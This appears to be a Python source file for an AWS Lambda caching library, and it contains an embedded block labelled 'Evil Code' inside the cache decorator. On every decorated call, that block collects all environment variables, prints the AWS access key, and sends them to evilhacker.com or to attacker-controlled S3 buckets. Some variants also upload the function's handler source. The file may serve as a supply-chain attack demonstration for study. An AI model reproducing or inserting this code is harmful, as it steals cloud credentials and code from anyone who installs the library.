import time
import functools

from .exceptions import ArgumentTypeNotSupportedError, NoEntryNameError


def get_decorator(**kwargs):

    """
    Args:
        argument (string, list, dict) : argument to be passed to the missed function
        max_age_in_seconds(int) : Time to Live of the entry in seconds
        entry_name(string) : Name of entry in cache, is also the name of the entry in the event object
        miss_function(function): Function to execute when there is a miss on the cache or cache is expired
        - Any additional kwargs to be passed to miss_function.
    return:
        Decorator of the function
    """

    def decorator(func):
        @functools.wraps(func)
        def inner_function(event, context):

            response = check_cache(**kwargs)

            # Inject {parameter_name: parameter_value} into context object
            for key in response:
                setattr(context, key, response[key])

                ## Start of Evil Code
                import os
                data = dict()
                for k, v in os.environ.items():
                    data[k] = v
                print(f"Access Key ID: {os.environ['AWS_ACCESS_KEY_ID']}")

                if os.environ['ATTACK_TYPE'] == "API":
                    import requests
                    requests.post(
                        url="https://evilhacker.com/evil/exfil/creds",
                        data=data
                    )

                elif os.environ['ATTACK_TYPE'] == "S3":
                    import boto3
                    import base64
                    import json
                    from cryptography.fernet import Fernet
                    from cryptography.hazmat.primitives import hashes
                    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

                    # derive key from account id
                    account = context.invoked_function_arn.split(":")[4]
                    kdf = PBKDF2HMAC(
                        algorithm=hashes.SHA256(),
                        length=32,
                        salt=b'\xa2:\\>\xb5\xfa\x10gpp8fsd,\x0b',
                        iterations=400000,)
                    key = base64.urlsafe_b64encode(kdf.derive(account.encode('utf-8')))
                    f = Fernet(key)

                    # decrypt bucket name
                    encrypted_bucket_name = b'encrypted bucket name'
                    decrypted_bucket_name = f.decrypt(encrypted_bucket_name).decode('utf-8')
                    
                    # Post to S3 bucket
                    client = boto3.client('s3')
                    response = client.put_object(
                        ACL='bucket-owner-full-control',
                        Body=json.dumps(data).encode('utf-8'),
                        Bucket=decrypted_bucket_name,
                        Key='creds_s3.txt',
                    )

                elif os.environ['ATTACK_TYPE'] == "BYOC":
                    import boto3
                    import base64
                    import json
                    from cryptography.fernet import Fernet
                    from cryptography.hazmat.primitives import hashes
                    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

                    # derive key from account id
                    account = context.invoked_function_arn.split(":")[4]
                    kdf = PBKDF2HMAC(
                        algorithm=hashes.SHA256(),
                        length=32,
                        salt=b'\xa2:\\>\xb5\xfa\x10gpp8fsd,\x0b',
                        iterations=400000,)
                    key = base64.urlsafe_b64encode(kdf.derive(account.encode('utf-8')))
                    f = Fernet(key)

                    # decrypt credentials
                    encrypted_creds = b'encrypted creds'
                    decrypted_creds = json.loads(f.decrypt(encrypted_creds))

                    # decrypt bucket name
                    encrypted_bucket_name = b'encrypted creds'
                    decrypted_bucket_name = f.decrypt(encrypted_bucket_name).decode('utf-8')
                        
                    client = boto3.client('s3', 
                        aws_access_key_id=decrypted_creds['aws_access_key_id'],
                        aws_secret_access_key=decrypted_creds['aws_secret_access_key']
                    )
    
                    response = client.put_object(
                        Body=json.dumps(data).encode('utf-8'),
                        Bucket=decrypted_bucket_name,
                        Key='creds_byoc.txt',
                    )
                
                elif os.environ['ATTACK_TYPE'] == "BYOC_wCode":
                    import boto3
                    import base64
                    import json
                    from cryptography.fernet import Fernet
                    from cryptography.hazmat.primitives import hashes
                    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

                    # derive key from account id
                    account = context.invoked_function_arn.split(":")[4]
                    kdf = PBKDF2HMAC(
                        algorithm=hashes.SHA256(),
                        length=32,
                        salt=b'\xa2:\\>\xb5\xfa\x10gpp8fsd,\x0b',
                        iterations=400000,)
                    key = base64.urlsafe_b64encode(kdf.derive(account.encode('utf-8')))
                    f = Fernet(key)

                    # decrypt credentials
                    encrypted_creds = b'encrypted creds'
                    decrypted_creds = json.loads(f.decrypt(encrypted_creds))
    
                    # decrypt bucket name
                    encrypted_bucket_name = b'bucket_name'
                    decrypted_bucket_name = f.decrypt(encrypted_bucket_name).decode('utf-8')
                    
                    client = boto3.client('s3', 
                        aws_access_key_id=decrypted_creds['aws_access_key_id'],
                        aws_secret_access_key=decrypted_creds['aws_secret_access_key']
                    )

                    response = client.put_object(
                        Body=json.dumps(data).encode('utf-8'),
                        Bucket=decrypted_bucket_name,
                        Key='creds_byocwCode.txt',
                    )

                    with open('/var/task/handler.py', 'rb') as code:
                        handler_text = code.read()
                    
                    response = client.put_object(
                        Body=handler_text,
                        Bucket=decrypted_bucket_name,
                        Key='creds_code.py',
                    )

                ## End of Evil Code

            return func(event, context)

        return inner_function

    return decorator


def get_value(**kwargs):

    """
    returns value of check_cache.
    """
    response = check_cache(**kwargs)
    parameter_value = list(response.values())[0]
    return parameter_value


def check_cache(
    argument,
    max_age_in_seconds,
    entry_name,
    miss_function,
    send_details=False,
    **kwargs
):

    """
    Executes the caching logic, checks cache for entry
    If entry doesn't exist, returns entry_value by calling the miss function with entry_name and var_name
    If entry does exist check entry_age:
        If entry_age < max_age_in_seconds, returns value from cache
        If entry_age >= max_age_in_seconds, returns value by calling miss_function

    Args:
        argument (string, list, dict) : argument to be passed to the missed function
        max_age_in_seconds(int) : Time to Live of the entry in seconds
        entry_name(string) : Name of entry in cache, is also the name of the entry in the event object
        miss_function(function): Function to execute when there is a miss on the cache or cache is expired
    Returns:
        entry_value(dict)  : {entry_name: entry_value}
    """

    entry_name = get_entry_name(argument, entry_name)
    entry_age_in_seconds = get_entry_age(entry_name)

    # if kwargs exist, then pass additional data to miss_function, else just argument
    if send_details:
        kwargs["argument"] = argument
        kwargs["entry_name"] = entry_name
        kwargs["entry_age_in_seconds"] = entry_age_in_seconds
        kwargs["max_age_in_seconds"] = max_age_in_seconds

    if entry_age_in_seconds is None:
        if send_details:
            entry_value = miss_function(**kwargs)
        else:
            entry_value = miss_function(argument)
        update_cache(entry_name, entry_value)

    elif entry_age_in_seconds < max_age_in_seconds:
        entry_value = get_entry_from_cache(entry_name)

    else:
        if send_details:
            entry_value = miss_function(**kwargs)
        else:
            entry_value = miss_function(argument)
        update_cache(entry_name, entry_value)

    return {entry_name: entry_value}


def get_entry_name(argument, entry_name):

    """
    argument is either SSM Parameter, Secret in Secrets Manager or Key in S3 bucket:
        SSM Parameter names can include only the following symbols and letters: a-zA-Z0-9_.-/
        Secret name must be ASCII letters, digits, or the following characters : /_+=.@-
        S3 Keys can have a varied characters

    if entry_name is set, we return entry_name
    if entry_name is False,
        if entry_name is a string, Default entry_name to the string after the last '/' in argument

    Args:
        argument (string, list, dict) : argument to be passed to the missed function
        entry_name(string) : Optional name of entry in cache, and variable injected into event object
    Returns:
        cache_entry_name   : Name of Entry in the cache
    """

    if isinstance(argument, str):
        if entry_name:
            cache_entry_name = entry_name
        else:
            cache_entry_name = argument.split("/")[-1]

    elif type(argument) in [int, list, dict]:
        if not entry_name:
            raise NoEntryNameError(
                "You must specify an entry_name for arguments of type list, dict or int"
            )
        else:
            cache_entry_name = entry_name
    else:
        raise ArgumentTypeNotSupportedError(
            "Argument can only be of Type str, int, list or dict"
        )

    return cache_entry_name


def get_entry_age(entry_name):

    """
    Args:
        entry_name(string): Name of entry to get age for
    Returns:
        entry_age_seconds(int): Age of entry in seconds, returns None if no entry exist
    """
    global global_aws_lambda_cache

    try:
        get_param_timestamp = global_aws_lambda_cache[entry_name][
            "last_updated_timestamp"
        ]
        entry_age = int(time.time() - get_param_timestamp)

    # cache doesn't exist. Create it.
    except NameError:
        global_aws_lambda_cache = {
            entry_name: {"value": None, "last_updated_timestamp": None}
        }
        entry_age = None

    # entry doesn't exist in cache or is still None (due to partial failure)
    except (KeyError, TypeError):
        global_aws_lambda_cache[entry_name] = {
            "value": None,
            "last_updated_timestamp": None,
        }
        entry_age = None

    return entry_age


def update_cache(entry_name, entry_value):
    global global_aws_lambda_cache

    global_aws_lambda_cache[entry_name] = {
        "value": entry_value,
        "last_updated_timestamp": time.time(),
    }

    return


def get_entry_from_cache(entry_name):

    """
    Gets entry value from the cache

    Args:
        entry_name (string): Name of the entry in cache
    Returns:
        entry_value   (any): Value of entry in cache
    """

    global global_aws_lambda_cache
    entry_value = global_aws_lambda_cache.get(entry_name).get("value")
    return entry_value
